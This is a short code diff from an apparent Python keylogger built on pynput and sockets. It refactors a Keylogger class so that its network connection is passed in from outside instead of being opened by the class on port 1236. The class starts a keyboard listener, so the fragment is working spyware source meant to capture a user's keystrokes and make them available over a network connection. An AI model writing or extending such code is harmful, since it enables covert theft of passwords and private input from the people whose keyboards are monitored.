@@ -19,23 +19,12 @@ from pynput import keyboard
 import socket
 
 class Keylogger:
-    def __init__(self):
+    def __init__(self, conn):
         self.key = ""
         self.listener = None
-        self.port = 1236
-        self.host = "0.0.0.0"
-        self.server_socket = None
-        self.conn = None
-        self.address = ""
+        self.conn = conn
     
     def start(self):
-        self.server_socket = socket.socket()
-        self.server_socket.bind((self.host, self.port))
-        self.server_socket.listen(1)
-
-        self.conn, self.address = self.server_socket.accept()
-        print("Connection from: " + str(self.address))
-
         self.listener = keyboard.Listener(on_press=self.log)
         self.listener.start()
 
